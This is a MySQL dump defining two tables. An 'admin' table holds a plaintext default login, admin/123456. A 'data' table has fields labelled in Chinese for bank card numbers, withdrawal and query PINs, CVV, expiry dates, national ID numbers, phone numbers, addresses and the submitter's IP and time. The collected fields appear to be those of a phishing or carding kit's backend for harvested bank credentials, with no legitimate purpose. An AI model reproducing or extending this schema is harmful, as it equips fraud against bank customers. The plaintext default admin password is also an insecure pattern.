/*
 Navicat MySQL Data Transfer

 Source Server         : vagrant
 Source Server Type    : MySQL
 Source Server Version : 50560
 Source Host           : 192.168.66.66:3306
 Source Schema         : card

 Target Server Type    : MySQL
 Target Server Version : 50560
 File Encoding         : 65001

 Date: 03/11/2018 23:30:00
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for admin
-- ----------------------------
DROP TABLE IF EXISTS `admin`;
CREATE TABLE `admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `account` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL,
  `passwd` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

-- ----------------------------
-- Records of admin
-- ----------------------------
BEGIN;
INSERT INTO `admin` VALUES (1, 'admin', '123456');
COMMIT;

-- ----------------------------
-- Table structure for data
-- ----------------------------
DROP TABLE IF EXISTS `data`;
CREATE TABLE `data` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bank_name` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '银行名称',
  `card_number` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '银行卡号',
  `password` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '取款密码',
  `password2` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '查询密码',
  `name` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '姓名',
  `id_card` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '身份证',
  `phone` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '预留手机号',
  `recharge_phone` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '充值手机号',
  `type` enum('储蓄卡','信用卡') COLLATE utf8mb4_bin DEFAULT '储蓄卡' COMMENT '银行卡类型',
  `cw` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT 'CW',
  `validity` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '有效期',
  `address` varchar(500) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '收货地址',
  `email` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '邮箱',
  `mobile` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '收货手机号码',
  `addressee` varchar(255) COLLATE utf8mb4_bin DEFAULT NULL COMMENT '收货人姓名',
  `IP` varchar(100) COLLATE utf8mb4_bin DEFAULT NULL COMMENT 'IP',
  `created_at` timestamp NULL DEFAULT NULL COMMENT '提交时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_bin;

